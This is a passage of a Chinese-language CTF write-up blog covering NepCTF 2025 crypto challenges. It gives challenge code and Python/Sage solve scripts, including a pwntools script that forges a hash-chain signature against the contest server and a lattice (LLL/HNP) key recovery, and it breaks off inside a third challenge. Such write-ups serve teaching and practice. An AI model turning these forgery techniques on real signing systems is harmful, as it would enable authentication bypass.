language_">self</span>.keygen()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>(<span class="hljs-params">self</span>):<br>        rng = SystemRandom()<br>        <span class="hljs-variable language_">self</span>.sk = [rng.randbytes(<span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>)]<br>        <span class="hljs-variable language_">self</span>.pk = [SM3_n(<span class="hljs-variable language_">self</span>.sk[_], <span class="hljs-number">255</span>, <span class="hljs-variable language_">self</span>.n) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>)] <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.sk, <span class="hljs-variable language_">self</span>.pk<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sign</span>(<span class="hljs-params">self, msg, sk=<span class="hljs-literal">None</span></span>): <br>        sk = sk <span class="hljs-keyword">if</span> sk <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.sk  <br>        m = SM3(msg) <br>        m_bin = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(m, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>) <br>        a = [<span class="hljs-built_in">int</span>(m_bin[<span class="hljs-number">8</span> * i: <span class="hljs-number">8</span> * i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.n // <span class="hljs-number">8</span>)]<br>        step = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span>;<br>        qq = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span> <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            step[i] = a[i] <br>            qq[i] = SM3_n(sk[i], step[i])<br>        <span class="hljs-built_in">sum</span> = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-built_in">sum</span>[i] = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65</span>):<br>                <span class="hljs-keyword">if</span> m[j - <span class="hljs-number">1</span>] == <span class="hljs-variable language_">self</span>.hex_symbols[i]:<br>                    <span class="hljs-built_in">sum</span>[i] += j<br>            step[i + <span class="hljs-number">32</span>] = <span class="hljs-built_in">sum</span>[i] % <span class="hljs-number">255</span><br>            qq[i + <span class="hljs-number">32</span>] = SM3_n(sk[i + <span class="hljs-number">32</span>], step[i + <span class="hljs-number">32</span>]) <br>        <span class="hljs-keyword">return</span> [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> qq]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">verify</span>(<span class="hljs-params">self, msg, qq, pk=<span class="hljs-literal">None</span></span>):<br>        qq = [<span class="hljs-built_in">bytes</span>.fromhex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> qq]<br>        pk = pk <span class="hljs-keyword">if</span> pk <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.pk<br>        m = SM3(msg)<br>        m_bin = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(m, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)<br>        a = [<span class="hljs-built_in">int</span>(m_bin[<span class="hljs-number">8</span> * i: <span class="hljs-number">8</span> * i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>.n // <span class="hljs-number">8</span>)]<br>        step = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span>;<br>        pk_ = [<span class="hljs-number">0</span>] * <span class="hljs-number">48</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            step[i] = a[i]<br>            pk_[i] = SM3_n(qq[i], <span class="hljs-number">255</span> - step[i])<br>        <span class="hljs-built_in">sum</span> = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-built_in">sum</span>[i] = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65</span>):<br>                <span class="hljs-keyword">if</span> m[j - <span class="hljs-number">1</span>] == <span class="hljs-variable language_">self</span>.hex_symbols[i]:<br>                    <span class="hljs-built_in">sum</span>[i] += j<br>            step[i + <span class="hljs-number">32</span>] = <span class="hljs-built_in">sum</span>[i] % <span class="hljs-number">255</span><br>            pk_[i + <span class="hljs-number">32</span>] = SM3_n(qq[i + <span class="hljs-number">32</span>], <span class="hljs-number">255</span> - step[i + <span class="hljs-number">32</span>]) <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> pk_ == pk <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;initializing...&#x27;</span>)<br>Sign = Nepsign()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">match</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt; &#x27;</span>)):<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            msg = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;msg: &#x27;</span>)) <br>            <span class="hljs-keyword">if</span> msg != <span class="hljs-string">b&#x27;happy for NepCTF 2025&#x27;</span>: <br>                <span class="hljs-built_in">print</span>(Sign.sign(msg))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You can&#x27;t do that&quot;</span>)<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            qq = literal_eval(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;give me a qq: &#x27;</span>))<br>            <span class="hljs-keyword">if</span> Sign.verify(<span class="hljs-string">b&#x27;happy for NepCTF 2025&#x27;</span>, qq): <br>                <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a><strong>分析</strong></h3><p>首先明确我们的目的，是要求出一个长度为48的<code>qq</code>列表，这个<code>qq</code>列表中的<code>qq[i]</code>都是<code>sk[i]</code>经过<code>step[i]</code>次SM3哈希之后得到的值。<br><strong>关键点分析</strong>：</p><ul><li>由于我们已经知道了明文就是<code>happy for NepCTF 2025</code>，因此根据题目给出的算法我们能够求出<code>step</code>列表</li><li>其次，我们可以无限次地请求签名</li><li>最重要的一点是，我们可以手动对<code>qq[i]</code>进行<code>step[i]</code>的增加，因为我们知道SM3的算法<br>因此，我们的思路已经明确，就是要找到一个<code>qq</code>序列，保证对应每个<code>step[i]</code>都小于原本明文的<code>step[i]</code>，这样我们就可以计算出<code>target_step[i]-step[i]</code>，从而手动恢复出正确的<code>qq</code>序列。<br>注意，我们并不需要这48个<code>qq[i]</code>由同一次签名得出，因为每个<code>qq[i]</code>和<code>step[i]</code>的对应关系跟其他的没有联系，也就是说，我们可以重复请求签名，知道每个<code>i</code>都有了对应的<code>qq[i]、step[i]</code>使得<code>step[i]&lt;target_step[i]</code>。</li></ul><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a><strong>解答</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm3<br><span class="hljs-keyword">import</span> os, ast, random, sys<br><br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span>   <br><br>HEX = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> sm3.sm3_hash([b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3_n</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        data = <span class="hljs-built_in">bytes</span>.fromhex(SM3(data))<br>    <span class="hljs-keyword">return</span> data.<span class="hljs-built_in">hex</span>()[:<span class="hljs-number">64</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_steps</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>):<br>    m_hex = SM3(msg)<br>    m_bin = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(m_hex, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">256</span>)<br>    steps = [<span class="hljs-number">0</span>]*<span class="hljs-number">48</span><br><br>    <span class="hljs-comment"># 前 32 个直接取 256bit 哈希的各字节</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        steps[i] = <span class="hljs-built_in">int</span>(m_bin[<span class="hljs-number">8</span>*i:<span class="hljs-number">8</span>*i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment"># 后 16 个按出现位置求和再 mod 255</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        s = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j, ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(m_hex, <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> ch == HEX[i]:<br>                s += j<br>        steps[<span class="hljs-number">32</span>+i] = s % <span class="hljs-number">255</span><br>    <span class="hljs-keyword">return</span> steps<br><br>TARGET_MSG = <span class="hljs-string">b&#x27;happy for NepCTF 2025&#x27;</span><br>target_step = calc_steps(TARGET_MSG)<br><br>HOST, PORT = <span class="hljs-string">&#x27;nepctf30-yctq-jzxl-h59c-3yzhv08pk172.nepctf.com&#x27;</span>,<span class="hljs-number">443</span> <br>io = remote(HOST, PORT , ssl = <span class="hljs-literal">True</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;initializing&#x27;</span>) <br><br>collected_q  = [<span class="hljs-literal">None</span>]*<span class="hljs-number">48</span><br>collected_st = [<span class="hljs-literal">None</span>]*<span class="hljs-number">48</span><br>need = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>))<br><br><br><br>log.info(<span class="hljs-string">&#x27;[*] Start collecting chain values …&#x27;</span>)<br><br><span class="hljs-keyword">while</span> need:<br><br>    io.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    rnd_msg = os.urandom(<span class="hljs-number">16</span>)<br>    io.sendlineafter(<span class="hljs-string">b&#x27;msg: &#x27;</span>, rnd_msg.<span class="hljs-built_in">hex</span>().encode())<br><br>    sig_line = io.recvline().strip().decode()<br>    <span class="hljs-keyword">try</span>:<br>        sig_list = ast.literal_eval(sig_line)<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">isinstance</span>(sig_list, <span class="hljs-built_in">list</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(sig_list) == <span class="hljs-number">48</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        log.error(<span class="hljs-string">f&#x27;parse sign fail: <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    cur_step = calc_steps(rnd_msg)<br><br>    updated = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(need): <br>        <span class="hljs-keyword">if</span> cur_step[i] &lt;= target_step[i]:<br>            collected_q[i]  = sig_list[i]<br>            collected_st[i] = cur_step[i]<br>            need.remove(i)<br>            updated = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">if</span> updated:<br>        log.info(<span class="hljs-string">f&#x27;   progress: <span class="hljs-subst">&#123;<span class="hljs-number">48</span>-<span class="hljs-built_in">len</span>(need)&#125;</span>/48 collected&#x27;</span>)<br><br>log.success(<span class="hljs-string">&#x27;[+] All indices satisfied, forging final signature …&#x27;</span>)<br><br>final_qq = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>    delta = target_step[i] - collected_st[i]<br>    q_hex = collected_q[i]<br>    <span class="hljs-keyword">if</span> delta:<br>        q_hex = SM3_n(<span class="hljs-built_in">bytes</span>.fromhex(q_hex), delta)<br>    final_qq.append(q_hex)<br><br>log.info(<span class="hljs-string">f&#x27;Final qq: <span class="hljs-subst">&#123;final_qq&#125;</span>&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">b&#x27;give me a qq: &#x27;</span>, <span class="hljs-built_in">str</span>(final_qq).encode())<br><br>flag = io.recvline_contains(<span class="hljs-string">b&#x27;NepCTF&#x27;</span>).decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\n<span class="hljs-subst">&#123;flag&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="LatticeBros"><a href="#LatticeBros" class="headerlink" title="LatticeBros"></a>LatticeBros</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#已知α的极小多项式为三次多项式f(x),即f(α)=0,且α≈54236.606188881754809671280151541781895183337725393</span><br><span class="hljs-comment">#上述极小多项式的常数项为a0</span><br><br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> a0,alpha<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sqrt,log2<br><br>d=<span class="hljs-number">981020902672546902438782010902608140583199504862558032616415</span><br>p = d - a0<br><br>k=sqrt(log2(p))+log2(log2(p))<br>B = <span class="hljs-number">2</span>**<span class="hljs-number">30</span><br><span class="hljs-keyword">assert</span> B &lt; p/<span class="hljs-number">2</span>**k<br><br>m = <span class="hljs-number">30</span><br><span class="hljs-keyword">assert</span> m &gt; <span class="hljs-number">2</span>*sqrt(log2(p))<br><br>samples = []<br>betas = []<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;samples.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    t = random.randint(<span class="hljs-number">1</span>, p-<span class="hljs-number">1</span>)<br>    beta = random.randint(-B + <span class="hljs-number">1</span>, B - <span class="hljs-number">1</span>)<br>    a = (t * alpha - beta) % p<br>    samples.append((t, a))<br>    betas.append(beta)<br><br>f.write(<span class="hljs-built_in">str</span>(samples))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>):<br>    <span class="hljs-keyword">assert</span> (betas[i]-samples[i][<span class="hljs-number">0</span>]*alpha+samples[i][<span class="hljs-number">1</span>])%p == <span class="hljs-number">0</span><br><br><span class="hljs-comment">#flag = long_to_bytes(alpha)</span><br></code></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>已知$\alpha$的极小多项式是三次多项式，且$f(\alpha)&#x3D;0$，即<br>$\alpha^3 + a_2\alpha^2 + a_1\alpha +a_0&#x3D;0$</p><p>可以构造格：</p><span>$$(1,a_2,a_1,a_0)\begin{pmatrix}1 & 0 & 0 & \alpha^{3} C \\0 & 1 & 0 & \alpha^{2} C \\0 & 0 & 1 & \alpha C \\0 & 0 & 0 & C \end{pmatrix}\\=(1,a_2,a_1,\epsilon C)$$</span><p>其中$\epsilon$接近0，则$\epsilon C$接近0。格基规约就可以求出$a_2、a_1$，然后带回方程式求出$a_0$，之后就是正常的HNP问题。</p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;samples.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    samples_str = f.read()<br>    samples = ast.literal_eval(samples_str)<br><br>d = <span class="hljs-number">981020902672546902438782010902608140583199504862558032616415</span><br>alpha = <span class="hljs-number">54236.606188881754809671280151541781895183337725393</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    C = <span class="hljs-number">2</span>^i<br>    M = matrix(QQ,[[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,C*alpha^<span class="hljs-number">3</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,C*alpha^<span class="hljs-number">2</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,C*alpha],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,C]])<br><br>    L = M.LLL()<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> L:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(l[<span class="hljs-number">0</span>]) == <span class="hljs-number">1</span>:<br>            r = l<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#print(r)</span><br>    a1 = r[<span class="hljs-number">2</span>]<br>    a2 = r[<span class="hljs-number">1</span>]<br>    a0 = <span class="hljs-built_in">int</span>(-alpha^<span class="hljs-number">3</span> - a2*alpha^<span class="hljs-number">2</span> - a1*alpha)<br>    p = d - a0<br>    <span class="hljs-comment">#print(p)</span><br><br>    a_list = []<br>    t_list = []<br>    <span class="hljs-keyword">for</span> t, a <span class="hljs-keyword">in</span> samples:<br>        a_list.append(a)<br>        t_list.append(t)<br>    n = <span class="hljs-built_in">len</span>(t_list)<br><br>    kbits = <span class="hljs-number">30</span><br>    K = <span class="hljs-number">2</span> ^ kbits -<span class="hljs-number">1</span><br>    <span class="hljs-comment">#print(t_list)</span><br>    M = Matrix(QQ,n+<span class="hljs-number">2</span>,n+<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        M[i,i] = p<br>        M[-<span class="hljs-number">2</span>,i] = t_list[i]<br>        M[-<span class="hljs-number">1</span>,i] = -a_list[i]<br>    b = K/p<br>    M[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>] = b<br>    M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = K<br>    <span class="hljs-comment">#print(M)</span><br>    L2 = M.LLL()<br>    x = L2[<span class="hljs-number">1</span>][-<span class="hljs-number">2</span>] // b % p<br>    ans = long_to_bytes(x)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NepCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> ans:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-built_in">print</span>(ans)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="unloopshock"><a href="#unloopshock" class="headerlink" title="unloopshock"></a>unloopshock</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = os.getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>,<span class="hljs-string">&#x27;test&#123;This_is_a_test_flag_connect_to_get_true_flag&#125;&#x27;</span>).encode()<br><br><br>CODE_COUNT = <span class="hljs-number">0</span><br>TARGET_COUNT = <span class="hljs-number">0</span><br><span class="hljs-comment"># memory address where emulation starts</span><br>CODE_ADDRESS    = <span class="hljs-number">0x110000</span><br>DATA_ADDRESS    = <span class="hljs-number">0x220000</span><br>KEY_ADDRESS     = <span class="hljs-number">0x440000</span><br>STACK_ADDRESS   = <span class="hljs-number">0x880000</span><br>CODE = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./src/prog_aes4&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    CODE = f.read()<br><br><br>ENTRY_POINT = CODE_ADDRESS + <span 